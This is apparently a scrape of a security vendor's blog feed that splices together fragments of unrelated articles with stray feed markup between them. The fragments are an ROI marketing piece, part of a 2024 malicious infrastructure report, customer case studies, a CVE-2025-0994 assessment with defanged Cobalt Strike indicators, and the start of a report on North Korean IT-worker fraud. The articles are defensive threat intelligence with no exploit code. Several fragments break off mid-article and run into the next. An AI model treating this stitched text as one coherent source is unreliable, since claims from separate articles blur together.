          <li>Difficulty prioritizing among a constant stream of alerts</li>
          <li>Challenges in demonstrating value to organizational leadership</li>
        </ul>
        <p>These challenges create a significant productivity gap that affects not just the security team, but the entire organization's resilience against cyber threats.</p>
        <p>"Threat intelligence will always improve your visibility. The important part is to do it without overburdening your team. How can we add new threat intelligence use cases without creating a whole load of extra work and alerts to deal with?" explains Jason Steer, CISO at Recorded Future.</p>
        <h2>Measuring the ROI of Recorded Future's Efficiency Gains</h2>
        <p>Recent research conducted by UserEvidence paints a compelling picture of how Recorded Future transforms security operations. In a comprehensive survey of security professionals using the platform, the data revealed remarkable efficiency gains realized by teams, for example:</p>
        <ul>
          <li><strong>Teams save an average of 11 hours weekly</strong> on alert triage, investigation, and response</li>
          <li><strong>Threat analysis, hunting, and reporting time reduced by 11 hours weekly</strong></li>
          <li><strong>Brand abuse mitigation efforts streamlined by 8 hours per week</strong></li>
          <li><strong>Spending 7 hours less per week on vendor and supplier evaluation processes</strong></li>
        </ul>
        <p>When translated to financial impact, these productivity improvements add up to approximately <strong>$290,237 in annual savings</strong> for the average organization implementing Recorded Future. Later in this article, we’ll break down the full picture.</p>
        <p>As one <a href="https://app.userevidence.com/assets/4669MYFV">Senior SOC analyst and Threat Intelligence Analyst</a> at an Air Freight &amp; Logistics company reported: "We automated 70% of manual workflows with Recorded Future, cutting investigation times by 50%. This led to a 40% increase in threat detection efficiency and a 30% reduction in response times, enhancing our overall security posture."</p>
        <p><a href="http://uevi.co/2879KFMW">Valentin Vanlaeys, Threat Intelligence Lead</a> at Proximus Ada, shared similar results: "Thanks to Recorded Future's valuable and actionable data, we cut our intelligence hunting, reporting, and analysis by 80%."</p>
        <h2>How Recorded Future Transforms Security Operations</h2>
        <h3>Common Challenges Security Teams Face in Productivity</h3>
        <h4>Before: Manual Processes Amidst High Urgency</h4>
        <p>Without Recorded Future's automated intelligence capabilities, security teams shoulder the burden of time-consuming manual workflows that may look something like this:</p>
        <ol>
          <li>Finding relevant data sources across open-source intelligence feeds, blogs, news outlets, social media, and forums</li>
          <li>Collecting unstructured and complex data from these sources</li>
          <li>Sifting through the data to separate signal from noise</li>
          <li>Analyzing the information to identify potential threats</li>
          <li>Compiling and distributing reports</li>
        </ol>
        <p>These processes – along with manual alert triage, investigation, and response – aren’t just frustratingly manual for team members. They also delay or slow down organizations’ response times.</p>
        <p>Security teams are inundated with alerts, some of which are noise and some of which are relevant and urgent. If they don’t have actionable threat intelligence, they can’t efficiently gain an understanding of the priority or criticality of each. And when it comes to addressing a security threat, time is of the essence.</p>
        <h4>After: Actionable Intelligence and Automation with Recorded Future</h4>
        <p>Recorded Future helps teams efficiently capture, compile, and analyze threat data, turning it into actionable intelligence that teams would otherwise need to triage, investigate, and respond to manually. This frees the security team to focus their energy on responding to high-priority threats and hunting new ones. Rather than struggling to address everything that seems important, they can think strategically about protecting their organization.</p>
        <p>With the Recorded Future Intelligence Platform, teams can shift from reactive to proactive security postures:</p>

            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>In 2024, Insikt Group significantly expanded its tracking of malicious infrastructure by covering more malware families and categories, additional infrastructure types such as staging servers, and integrating data sources like Recorded Future® Network Intelligence, enhancing threat detection, higher-tier infrastructure insights, and victimology analysis. While many key 2023 trends persisted — such as Cobalt Strike dominating offensive security tools (OSTs), AsyncRAT and QuasarRAT leading among remote access trojans (RATs), China and the United States (US) being the top hosting locations, and law enforcement actions having often only temporary impact — Insikt Group identified several emerging trends in 2024.</p>
        <p>Notably, malware-as-a-service (MaaS) infostealers, led by LummaC2, grew in prevalence, likely driven by law enforcement actions against competitor infostealers and rapid innovation by LummaC2. Additionally, Android remained the primary target for mobile malware, with Hook leading. While Latrodectus dominated droppers and loaders despite law enforcement disruptions in the loader ecosystem, traffic distribution systems (TDSs) continued to enhance cybercrime efficiency, as seen with TAG-124, and the abuse of content delivery networks (CDNs) like Cloudflare surged. In regards to state-sponsored groups, China notably increased its use of relay networks such as ArcSilt, while Russia continued its abuse of a wide range of <a href="/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses">legitimate internet services (LIS)</a>.</p>
        <p>Defenders should leverage this report's insights to strengthen security controls by prioritizing top malware and infrastructure techniques, and thereby enhance network monitoring and deploy relevant detections like YARA, Sigma, and Snort. This should be complemented by investments in tracking evolving malicious infrastructure dynamics, conducting threat simulations to test defenses, and effectively monitoring the broader threat landscape. Regarding LIS, defenders must balance blocking, flagging, or allowing high-risk services based on their assessed criticality and risk level.</p>
        <p>As malicious infrastructure evolves and detection improves, Insikt Group expects existing trends to persist in 2025, driven by continuous threat actor innovation rather than drastic shifts. For example, the "as-a-service" ecosystem will likely expand, and threat actors will increasingly rely on legitimate tools, services, and CDNs to evade detection. Furthermore, with growing mobile reliance, Insikt Group expects mobile-based threats to continue to rise. Relay networks, primarily used by Chinese state-sponsored groups up until now, may see broader adoption by cybercriminals and other state-sponsored groups. Lastly, law enforcement actions are expected to have a greater impact due to enhanced international cooperation and accrued expertise in large-scale cybercrime takedowns.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>MaaS infostealers led in infections in 2024, with LummaC2 dominating command-and-control (C2) servers as continuous innovation and law enforcement actions against rivals like RedLine Stealer reshaped the cybercrime ecosystem.</li>
          <li>AsyncRAT and Quasar RAT remained the top remote access tools (RATs), while MaaS-based malware like DcRAT continued widespread use.</li>
          <li>The US (North America), Brazil (South America), Angola (Africa), France (Europe), India (Asia), and Australia (Oceania) recorded the highest number of victims in their respective regions based on Recorded Future Network Intelligence, with AsyncRAT emerging as the most prevalent malware in most cases. Other significant threats included QuasarRAT and Cobalt Strike.</li>
          <li>Android remained the primary target for mobile malware, with nine of the top ten families focusing on it, alongside the rise of mercenary spyware and potentially unwanted programs (PUPs) like stalkerware.</li>
          <li>Cobalt Strike accounted for two-thirds of offensive security tool command-and-control (C2) servers, with jQuery as the most popular malleable profile and cs2modrewrite targeting the most victim countries. Cobalt Strike is followed by Metasploit, with detections of Sliver and Brute Ratel C4 rising significantly.</li>
          <li>Mozi Botnet was the largest tracked botnet in 2024 based on the number of identified bots, while older botnets remained active, being primarily used for distributed denial-of-service (DDoS) attacks, as well as credential theft and localized attacks, as seen with Fenix Botnet.</li>
          <li>Latrodectus dominated all droppers and loaders in 2024, accounting for 33% of detections, likely driven by law enforcement disruptions in the loader ecosystem, while most top families emerged post-2021, indicating shorter lifespans.</li>
          <li>TDS continued to play a crucial role in cybercrime by improving efficiency, targeting, and profitability while evading detection, exemplified by TAG-124, which served a broad user base, including ransomware groups like Rhysida.</li>
          <li>The US and China dominated malicious hosting, while bulletproof hosting providers like Stark Industries played a growing role in cybercrime infrastructure.</li>
          <li>Chinese state-sponsored groups expanded their use of anonymization networks in 2024 to target entities worldwide, enabling them to blend with legitimate traffic and complicate victim identification, while RedDelta used Cloudflare to proxy C2 traffic and geo-fence malicious files.</li>
          <li>Russian state-sponsored groups increasingly relied on legitimate services like Ngrok, Cloudflare, and Telegram to evade detection, with BlueDelta shifting to Ngrok after takedown efforts and BlueAlpha using Cloudflare Tunnels to stage GammaDrop malware.</li>
        </ul>
        <h2>Introduction</h2>
        <p>Insikt Group proactively identifies and monitors infrastructure associated with hundreds of malware families, threat actors, and other artifacts, including phishing kits, scanners, and relay networks. By automatically validating malicious infrastructure through various proprietary methods on a daily basis, Insikt Group provides accurate risk representation, enabling Recorded Future customers to enhance their detection and defense capabilities.</p>
        <p>Building on Insikt Group's annual adversary infrastructure reports from <a href="/research/2022-adversary-infrastructure-report">2022</a> and <a href="https://go.recordedfuture.com/hubfs/reports/cta-2024-1209.pdf">2023</a>, the 2024 Malicious Infrastructure Report provides a concise, data-based overview of malicious infrastructure observed throughout 2024. This year, it specifically emphasizes the synergy among passive infrastructure detection, higher-tier infrastructure insights powered by Recorded Future Network Intelligence, and victim identification. Overall, this report is for anyone interested in malicious infrastructure, offering a high-level overview of its current state as well as summaries of key findings to inform decision-making and provide a broad perspective in this highly dynamic environment.</p>
        <p>Recognizing the challenge of categorizing malware types in a mutually exclusive manner due to their overlapping functionalities, this report establishes a set of malware categories to facilitate analysis, as detailed in <strong>Appendix A</strong>, with brief definitions for each. Notably, certain malware categories, such as crypters, have been intentionally excluded due to the usual absence of network artifacts.</p>
        <p>Beyond examining malicious infrastructure through the lens of malware categories, Insikt Group also monitors it by type, with each type assigned a distinct risk scoring within the Recorded Future Intelligence Cloud. This differentiation reflects varying levels of severity — for instance, network traffic to or from a C2 server in a corporate network may indicate higher risk compared to a management panel, as it typically implies active malicious activity. The infrastructure types defined by Insikt Group are detailed in <strong>Appendix B</strong>.</p>
        <h2>2024 Malicious Infrastructure Insights by the Numbers</h2>
        <p>Proactively identifying malicious infrastructure is a complex task shaped by various factors. In addition to the vast volume of data, each malware family, version, or infrastructure linked to specific threat actors often employs entirely unique setups. Detection becomes even more challenging due to factors such as hosting behind CDNs like Cloudflare, the use of high or random ports, reliance on <a href="/research/threat-actors-leverage-internet-services-to-enhance-data-theft-and-weaken-security-defenses">legitimate internet services</a> such as Discord or Telegram, or the exploitation of compromised infrastructure.</p>
        <p>These setups also evolve continuously, demanding that Insikt Group constantly innovate and refine its tracking methodologies. Considering all these factors, this report examines malicious infrastructure across multiple categories, including infostealers, backdoors and RATs, mobile malware, OSTs, botnets, droppers and loaders, phishing kits, web shells, and ransomware.</p>
        <p>Overall, in 2024, there has been a significant rise in identified malicious infrastructure, driven by an evolving threat landscape and advancements in detection methodologies by Insikt Group. For instance, the number of unique, validated C2 servers doubled from 2023 to 2024, while unique, validated management panels saw a 69% increase over the same period.</p>
        <p>In addition, using Recorded Future Network Intelligence, Insikt Group identified victims in approximately 200 countries worldwide in 2024 based on victim IP address geolocation. Countries in <strong>Figure 1</strong> were categorized into five groups based on the number of unique victims detected, with those showing high exposure being geographically dispersed worldwide. Notably, accurately measuring malware impact across countries is challenging due to variations in population size, digital footprint, analytical biases (for example, the types of malware tracked), internet infrastructure (such as proxies), and the geographical hosting choices of victim organizations.</p>

        <p><strong>Figure 2</strong> shows the distribution of victims by country across different continents. In North America, the US is the most targeted country, accounting for around 87% of unique victims in the region despite making up only about half of its population. The high victim count in the US is likely driven by factors such as its large population, extensive digital footprint, widespread English use (exploited in phishing campaigns), and economics, while also being influenced by the country's role as a global infrastructure hub, providing hosting and digital services to organizations worldwide. Most victims are linked to AsyncRAT, followed by SolarMarker RAT and QuasarRAT (see <strong>Table 1</strong>). Notably, unlike AsyncRAT and QuasarRAT, SolarMarker RAT is <a href="/research/exploring-the-depths-of-solarmarkers-multi-tiered-infrastructure">believed</a> to be operated by a single threat actor and has previously been observed predominantly targeting the US.</p>

          </div>
        </div>
        <p>In South America, Brazil recorded the highest number of unique victims, accounting for 86% of the region’s total, while also only making up around half of the continent’s population. Previously <a href="https://www.forbes.com/sites/angelicamarideoliveira/2023/09/27/brazil-is-the-worlds-second-most-vulnerable-country-to-cyberattacks/">identified</a> as one of the countries most vulnerable to cyberattacks, Brazil has long been a hotspot for both global and local cyber threats, <a href="https://www.ox.ac.uk/news/2024-04-10-world-first-cybercrime-index-ranks-countries-cybercrime-threat-level">ranking</a> high in cybercrime activity, with groups like Grandoreiro operating almost exclusively within its borders. In 2024, QuasarRAT infections were the most prevalent among Brazilian victims, followed by infections linked to AsyncRAT and SectopRAT.</p>
        <p>In Africa, Angola recorded the highest number of unique victims, followed by Ghana, South Africa, the Republic of the Congo, and the Democratic Republic of the Congo. Notably, in two of the five most targeted African countries, PlugX, a malware linked to multiple Chinese state-sponsored groups, ranked among the most prevalent malware.</p>
        <p>In Europe, France had the highest number of unique victims, followed by Germany, the United Kingdom, the Netherlands, and Poland. AsyncRAT was the most prevalent malware across all five countries, with Cobalt Strike ranking second in three of them. The distribution of victims in these top five countries closely aligns with their population sizes. Notably, in the Netherlands, GobRAT — a backdoor targeting Linux routers with malware written in Go — ranked among the top three malware families.</p>
        <p>In Asia, India recorded the highest number of unique victims, followed by China, Indonesia, Thailand, and Hong Kong. Approximately 73% of all victims in these countries were linked to AsyncRAT, QuasarRAT, and Cobalt Strike infections. Notably, Brute Ratel C4 ranked among the top three malware in Hong Kong, highlighting its growing significance.</p>
        <p>In Oceania, Australia accounted for 87% of all unique victims despite making up only 60% of the region's population. AsyncRAT was the most prevalent malware, linked to over half of Australia's victims, while in New Zealand, 67% of victims were associated with AsyncRAT infections.</p>
        <p><strong>Table 1</strong> presents the full list of the top three malware families for each of the five leading countries in each continent, based on the number of unique victims observed by Insikt Group in those countries.</p>

            <description><![CDATA[Learn how security leaders defend against risks to their first- and third-party attack surfaces.]]></description>
            <content:encoded><![CDATA[
        <p>Modern attack surfaces extend across every place your business operates, from your first-party technology assets to your third-party network of suppliers and vendors. To spot risks before attackers do, you need to maintain continuous visibility across this expanding landscape. Employee credentials can become compromised, unknown or vulnerable internet assets can be exploited, and supply chain partners with spotty security hygiene can provide adversaries with easy access to your network and data.</p>
        <p>At Recorded Future, we’ve seen firsthand how practitioners are transforming their security programs by adopting proactive strategies to protect their first- and third-party attack surfaces.</p>
        <p>In our experience, security teams that successfully defend against these threats share a common approach: They combine comprehensive visibility with contextual intelligence.</p>
        <p>By understanding not just the risks that exist, but why those risks matter to the organization, these security teams enable rapid, informed decision-making that strengthens their security posture.</p>
        <p>In this blog post, we’ll explore how a few select customers are taking an intelligence-led approach to reducing attack surface risks. You’ll discover how:</p>
        <ul>
          <li>Toyota Motor North America <strong>quickly remediates compromised employee credentials</strong> to prevent unauthorized access.</li>
          <li>Cummins <strong>identifies and secures internet-facing assets</strong> to reduce their vulnerable attack surface.</li>
          <li>Novavax <strong>takes an intelligence-driven approach to vendor risk management</strong> for greater supply chain resilience.</li>
          <li>INVESTBANK <strong>maintains continuous awareness of vulnerabilities</strong> alongside new updates and releases.</li>
        </ul>
        <p>See the impactful results these companies have achieved, and learn how we can empower your security team to stay ahead of threats and build lasting resilience.</p>
        <h2>Toyota Motors North America Defends the Human Identity Attack Surface</h2>
        <p><em>"The timeliness of being able to take compromised credentials out of the marketplace is really beneficial."</em> — Curtis Hartsell, CTI Manager, Toyota Motors North America (<a href="/videos/toyota">watch the full video here</a>)</p>
        <p>According to the <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">2024 Verizon Data Breach Investigation Report</a>, 31% of all breaches over the last 10 years have involved the use of stolen credentials. With the rise of stealthy infostealers, threat actors are more likely to log in with stolen credentials than hack their way in. The Verizon report also found more than a thousand credentials being posted for sale on the dark web each day, with an average price of $10, proving that there’s serious demand from cybercriminals.</p>
        <p>To help Toyota Motors North America gain an edge, Cyber Threat Intelligence Manager Curtis Hartsell relies on Recorded Future’s <a href="/products/identity-intelligence">Identity Intelligence Module</a>. The product allows Hartsell and team to take swift action on compromised credentials, automating credential resets before bad actors can gain access to the company’s systems.</p>
        <p>In one example, he said, “We had a compromised credential at 7 o’clock. Two hours later Identity [Intelligence] is notifying of those compromised credentials, and about thirty or forty minutes after the Identity Module alert, we see attempts to use that account.”</p>
        <p>Immediate visibility into newly compromised credentials helps Toyota Motors North America automate response actions and secure accounts instantly. This automation eliminates the need for constant manual intervention, allowing Hartsell and team to focus on higher-value tasks.</p>
        <h2>Cummins Identifies and Reduces Attack Surface Risk</h2>
        <p><em>“We have two main problem statements when we’re looking at this attack surface problem: What is our attack surface? And then how do we secure it? There’s a couple of different actions you take, whether it’s remediation or reduction. We love reduction. If it can’t be on the internet. Great. Let’s get it off there.”</em> — Mattheus Bittick, Attack Surface Reduction Analyst, Cummins (watch the full video <a href="https://fast.wistia.com/embed/channel/06bopitbe1?wchannelid=06bopitbe1&amp;wmediaid=1j7x7zezcc">here</a>)</p>
        <p>Continuous monitoring of your first-party attack surface — everything in your network and systems that can be accessed from the internet — is resource-intensive and challenging, especially given that employees and contractors often spin up assets outside your security team’s purview. This should be a major concern, as 76% of organizations have suffered a cyberattack that started with the exploit of an unknown, unmanaged, or poorly managed internet-facing asset (<a href="https://www.techtarget.com/searchsecurity/opinion/Why-companies-need-attack-surface-management-in-2024">TechTarget</a>).</p>
        <p>Before implementing Recorded Future’s <a href="/products/attack-surface-intelligence">Attack Surface Intelligence Module</a>, Cummins Attack Surface Reduction Analyst Mattheus Bittick said his team spent around 80 hours per week trying to analyze and map the company’s external attack surface. And even then, the team was blind to around 20% of the landscape.</p>
        <p>With no capacity for continuous scanning and information-gathering and no existing inventory specific to external-facing assets, Bittick’s team was unable to prioritize risks based on the attacker’s perspective. And since the company has had an internet presence for a long period of time, there was a large unexplored landscape of unknown unknowns and abandoned infrastructure.</p>
        <p>Now, Attack Surface Intelligence is a central technology for the Cummins Attack Surface Risk Management Program.</p>
        <p><em>“The first tool I go to every morning is Attack Surface Intelligence. What’s new today? What’s going on that we need to prioritize and triage? Recorded Future shows us how we can take action, and takes our risk assessments to the next level.”</em> — Mattheus Bittick, Attack Surface Reduction Analyst, Cummins</p>
        <p>Thanks to automated discovery and attribution of assets associated with the organization, Bittick and team get a real-time view of their external attack surface, from the same perspective as an attacker. This increased visibility into key areas of risk like vulnerabilities, misconfigurations, and shadow IT has helped Cummins reduce its vulnerable attack surface by 51% over a period of six months. And by removing key areas of risk and decommissioning forgotten infrastructure, the company has reduced its cyber insurance premiums by 32% year-over-year.</p>
        <h2>Novavax Proactively Monitors for Third-Party Vendor Breaches</h2>
        <p><em>“We sharpened a lot of processes by introducing Third-Party Intelligence to our risk assessments, so we can make informed decisions about the vendors we do business with…[Recorded Future] gives us an opportunity to launch an investigation to see what the vendor has access to, what we need to be concerned about, and how we can better protect ourselves.”</em> — Nathalie Salisbury, Strategic Threat Intelligence Analyst, Novavax (Watch the full video <a href="/videos/novavax">here</a>)</p>
        <p>Since third-party vendors aren’t always held to the same standards as enterprise organizations, those with spotty security hygiene can become the soft underbelly of your attack surface. <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">According to the 2024 Verizon Data Breach Investigation Report</a>, 15% of breaches involved a third party or supplier. And the <a href="https://www.ibm.com/downloads/documents/us-en/107a02e94948f4ec">IBM Cost of a Data Breach 2024 Report</a> found that the average cost of a breach increased by $240,599 when it came via a third party.</p>
        <p>Making matters worse, supply chain partners often delay or withhold disclosure of security incidents due to concerns about reputation and liability. As they take time to investigate and formulate damage-control strategies, the companies that rely on them may be unaware that their own systems are under attack or that their data has been compromised.</p>
        <p>Nathalie Salisbury, Strategic Threat Intelligence Analyst at <a href="/case-study/novavax">Novavax</a>, says that Recorded Future’s <a href="/products/third-party-intelligence">Third-Party Intelligence Module</a> shines a light on these risks before vendors disclose them.</p>
        <p>“A couple of times now, Recorded Future has alerted us to something prior to the third-party vendor,” she said. “That’s huge when we’re trying to protect our data. That gives us an opportunity to launch an investigation and see what the compromised vendor had access to, [what] we need to be concerned about, and [how to] evaluate our overall third-party risk.”</p>
        <p>As a result, Recorded Future is a critical part of the team’s proactive approach to managing their third-party attack surface, both in evaluating new vendors and continuously monitoring existing ones.</p>
        <h2>INVESTBANK Continuously Monitors and Protects Against Vulnerabilities</h2>
        <p><em>“Vulnerability Intelligence provides access to a large database of exploits and vulnerabilities so that we can remit them faster and implement compensation controls until a patch is released.”</em> — Riyad Jazmawi, Head of Information Security. (Read the full case study <a href="/case-study/investbank">here</a>).</p>
        <p>Vulnerabilities continue to be one of the top initial access vectors for threat actors. In fact, 2024 might have been a watershed for vulnerability exploitation. When Verizon looked at the critical paths attackers use to initiate breaches, <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">their research found</a> that vulnerability exploitation grew 3X year-over-year.</p>
        <p>This will come as little surprise to those who’ve tracked prominent ransomware groups over the past year. The exploitation of Progress Software’s <a href="/blog/2023-threat-analysis-and-2024-predictions">MOVEit</a> and other Managed File Transfer (MFT) products, such as <a href="/blog/cleo-mft-cve-2024-50623-vulnerability-analysis">Cleo MFT</a>, have enabled threat actors to successfully pull off a number of large-scale breaches.</p>
        <p><a href="/case-study/investbank">INVESTBANK</a> wanted to respond more productively to zero-day exploits and vulnerabilities being exploited in the wild. As a fast-moving organization with many digital services, it needed to ensure that it could maintain continuous awareness of any PoCs or critical vulnerabilities in its tech stack.</p>
        <p>Recorded Future’s <a href="/products/vulnerability-intelligence">Vulnerability Intelligence Module</a> has helped the company improve its defenses against vulnerabilities.</p>
        <p>“Vulnerability Intelligence provides access to a large database of exploits and vulnerabilities so that we can remit them faster and implement compensation controls until a patch is released,” said Riyad Jazmawi, Head of Information Security.</p>
        <p>To reduce risk, organizations must have visibility into the vulnerabilities in their tech stacks, and they need the context to make patching prioritization decisions. <a href="https://www.verizon.com/business/resources/Tdd9/reports/2024-dbir-data-breach-investigations-report.pdf">Verizon</a> found that it takes 55 days to remediate 50% of CISA Known Exploited Vulnerabilities (KEV) once patches become available.</p>
        <p>With Recorded Future’s Vulnerability Intelligence, you can pinpoint and take action on vulnerabilities to keep attackers from gaining access to your network and data.</p>
        <h2>Conclusion</h2>
        <p>As a security leader, you need visibility into any first-party or third-party asset that could be targeted and exploited by threat actors — and you need context to understand how to prioritize and mitigate threats.

        <h2>Insikt Group’s Assessment of CVE-2025-0994</h2>
        <p>Indicators of compromise (IoCs) shared by Trimble suggest that the vulnerability is being exploited to deliver custom Rust-based loaders capable of loading VShell and <a href="/blog/detect-cobalt-strike-inside-look">Cobalt Strike</a> into memory. Additionally, the threat actors delivered an obfuscated JavaScript payload located in the “%TEMP%” folder, two unknown files, three malicious executables with randomized, alphanumeric filenames (for example, “fq1u4t83[.]exe”), and two files masquerading as legitimate services (“winpty.dll” and “winpty-agent[.]exe”).</p>
        <p>The malicious files were likely downloaded into the victim's environment from threat actor-controlled Cobalt Strike C2 servers.</p>
        <p>Based on the IoCs shared by Trimble, the threat actors used <a href="https://app.recordedfuture.com/portal/intelligence-card/ip%3A192.210.239.172/overview?organization=uhash:5cJsHMHeSM">192.210.239[.]172:3219</a> and <a href="https://app.recordedfuture.com/portal/intelligence-card/ip%3A192.210.239.172/overview?organization=uhash:5cJsHMHeSM">192.210.239[.]172:4219</a> as staging infrastructure. Insikt Group has validated this IP address as a C2 server for <a href="https://app.recordedfuture.com/portal/intelligence-card/JLHNoH/overview?organization=uhash:5cJsHMHeSM">Cobalt Strike</a>.</p>
        <p>There is insufficient evidence to definitively confirm which files were transferred from the threat actor’s infrastructure; however, the obfuscated alphanumeric-named executables stored in the “\Temp” folder or the JavaScript payload are two possibilities.</p>
        <p>At the time of writing, there were 111 exposed Cityworks instances on Shodan, 21% of which are vulnerable based on identified version numbers. The majority of exposed instances are also geolocated in the US and include multiple .gov domains.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>In an era in which remote work has become the norm, North Korea has seized the opportunity to manipulate hiring processes, using fraudulent information technology (IT) employment to generate revenue for the regime. North Korean IT workers infiltrate international companies and secure remote positions under false identities. These operatives not only violate international sanctions but also pose severe cybersecurity threats, engaging in fraud and data theft and potentially disrupting business operations.</p>
        <p>Beyond financial fraud, these IT workers have been linked to cyber espionage. Insikt Group tracks PurpleBravo (formerly Threat Activity Group 120 [TAG-120]), a North Korean-linked cluster that overlaps with the “Contagious Interview” campaign, which primarily targets software developers in the cryptocurrency industry. The campaign employs malware such as BeaverTail, an infostealer that gathers sensitive information; InvisibleFerret, a cross-platform Python backdoor; and OtterCookie, a tool used to establish persistent access on compromised systems. At least three organizations in the broader cryptocurrency space were targeted by PurpleBravo between October and November 2024: a market-making company, an online casino, and a software development company.</p>
        <p>The findings also highlight North Korea’s expansion into other areas of fraud, with the establishment of front companies that mimic legitimate IT firms. TAG-121, a separate cluster of activity, has been identified as operating a network of these companies across China. Each front company spoofs a different legitimate organization by copying large parts of their website. These entities create an added layer of deniability and make detection more challenging, allowing North Korean actors to further embed themselves in global IT supply chains.</p>
        <p>The implications of this threat are far-reaching. Organizations that unknowingly hire North Korean IT workers may be in violation of international sanctions, exposing themselves to legal and financial repercussions. More critically, these workers almost certainly act as insider threats, stealing proprietary information, introducing backdoors, or facilitating larger cyber operations. Given North Korea’s history of financial theft, the risks extend beyond individual companies to the broader global financial system and national security interests.</p>
        <p>To mitigate these threats, organizations must adopt stringent identity verification measures, ensuring that remote hires undergo thorough screening. This includes requiring video interviews, notarized identification documents, and continuous monitoring of remote workers for anomalies. Employers should also implement technical controls to detect unauthorized access, restrict data exposure, and flag suspicious remote connections. Awareness and training for human resources (HR) teams and IT security personnel are essential in preventing these actors from infiltrating critical business operations.</p>
        <p>While the threat posed by North Korean IT workers is a fraud issue, it is also a key component of a sophisticated cyber strategy that financially sustains an internationally sanctioned regime. As these operations continue to evolve, businesses, governments, and cybersecurity organizations must work together to close the gaps that enable North Korea to exploit the remote work environment.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>North Korea’s use of IT workers to secure fraudulent employment and execute coordinated cyber campaigns highlights its evolving tactics to fund its military programs while undermining global intellectual property security.</li>
          <li>Insikt Group assesses that PurpleBravo has targeted at least seven entities, three of which are in the cryptocurrency sector, including a market-making firm, an online casino, and a software company.</li>
          <li>Insikt Group found evidence that PurpleBravo uses Astrill VPN to manage its command-and-control (C2) servers.</li>
          <li>PurpleBravo was found posting job advertisements on at least three hiring websites, Telegram, and GitHub.</li>
          <li>Insikt Group identified at least seven suspected North Korean-linked front companies operating in China spoofing legitimate IT firms in China, India, Pakistan, Ukraine, and the United States (US).</li>
          <li>Organizations should implement robust technical safeguards, such as, where feasible, disabling remote desktop software, conducting regular checks of open ports across networks, deploying insider threat monitoring, and geolocating devices.</li>
          <li>Insikt Group expects to continue to see groups like PurpleBravo and TAG-121 exploit the remote work environment, threatening global IT supply chains and intellectual property.</li>
          <li>North Korea’s shift toward fraudulent remote employment and front companies will likely outpace traditional hiring protocol checks, driving organizations and governments to adopt more rigorous identity verification, enhanced remote work security, and robust international intelligence-sharing to counter this expanding threat.</li>
        </ul>
        <h2>Background</h2>
        <p>On January 23, 2025, the US Department of Justice (US DOJ) <a href="https://www.justice.gov/opa/pr/two-north-korean-nationals-and-three-facilitators-indicted-multi-year-fraudulent-remote">indicted</a> two North Korean nationals and three facilitators for remote worker fraud that enriched the North Korean regime. In the indictment, the US DOJ described a six-year scheme in which two US citizens and one Mexican national conspired with North Korean IT workers to remotely work for at least 64 US companies. Payments from ten companies generated at least $866,255 in revenue that was laundered through a Chinese bank account. In addition to the indictment, stories of organizations and individuals that have come across North Korean IT workers can be regularly found in open sources (<a href="https://x.com/zachxbt/status/1824047425822310580">1</a>, <a href="https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html">2</a>, <a href="https://www.knowbe4.com/press/knowbe4-issues-warning-to-organizations-after-hiring-fake-north-korean-employee">3</a>). Besides sanctions violations, the threat from these workers, whether stealing sensitive data or installing malware on internal systems, presents unique challenges to organizations, especially in remote work environments.</p>
        <p>North Korea remains highly isolated from the outside world due to the regime’s strict control over goods, people, and information, as well as international sanctions placed upon the country. Despite this, Pyongyang’s leadership is <a href="/research/north-korea-internet-activity">well-versed</a> in exploiting emerging technologies to fund its operations. As sanctions have tightened, the regime <a href="/research/north-korea-cyber-activity">adapted</a> by escalating illicit activities, including smuggling and cybercrime. In recent years, the regime has achieved significant <a href="/research/crypto-country-north-koreas-targeting-cryptocurrency">success</a> in stealing from traditional financial institutions and digital assets like cryptocurrency. Between 2020 and 2024, the rise of remote work created new opportunities for North Korea to deploy skilled IT workers who infiltrate global companies under false identities. Their activities directly support the regime’s military programs while posing a significant threat to industries reliant on intellectual property.</p>
        <p>Research into North Korean IT workers has focused on the following aspects of the threat: North Korean IT workers gaining fraudulent <a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat">employment</a> through proxies; North Korean <a href="https://www.sentinelone.com/labs/dprk-it-workers-a-network-of-active-front-companies-and-their-links-to-china/">front companies</a>, often in the software development space, imitating legitimate organizations; and <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">fake</a> employment opportunities targeting software developers in cryptocurrency and AI, among other industries. Other research has established <a href="https://unit42.paloaltonetworks.com/fake-north-korean-it-worker-activity-cluster/">links</a> between IT workers and ongoing malicious campaigns by North Korean threat actors.</p>
        <h2>Threat Analysis</h2>
        <h3>PurpleBravo</h3>
        <p>The Contagious Interview campaign, first <a href="https://unit42.paloaltonetworks.com/two-campaigns-by-north-korea-bad-actors-target-job-hunters/">documented</a> in November 2023, targeted software developers primarily in the cryptocurrency space and was attributed to North Korea. The campaign used the JavaScript infostealer BeaverTail, the cross-platform Python backdoor InvisibleFerret, and most recently OtterCookie, a new backdoor <a href="https://jp.security.ntt/tech_blog/contagious-interview-ottercookie">identified</a> in December 2024. The group responsible for this activity is known as CL-STA-0240, Famous Chollima, and Tenacious Pungsan in open sources. Insikt Group has given this cluster of activity the designation PurpleBravo (formerly TAG-120).</p>
        <h4>PurpleBravo’s Fraudulent Profiles</h4>
        <p>On December 3, 2024, a developer posted a <a href="https://sohay666.github.io/article/en/reversing-scam-interview-base-on-js-project.html">blog</a> about their experience with a suspected PurpleBravo operator. An individual claiming to be a recruiter contacted them about a job offer and then followed up with an interview. During the interview, the interviewer asked the developer to download a coding challenge from a repository. The developer realized there was a malicious function in the file and ended the interview. While the developer does not attribute the malware or actor, Insikt Group assesses with high confidence the file is a BeaverTail infostealer.</p>
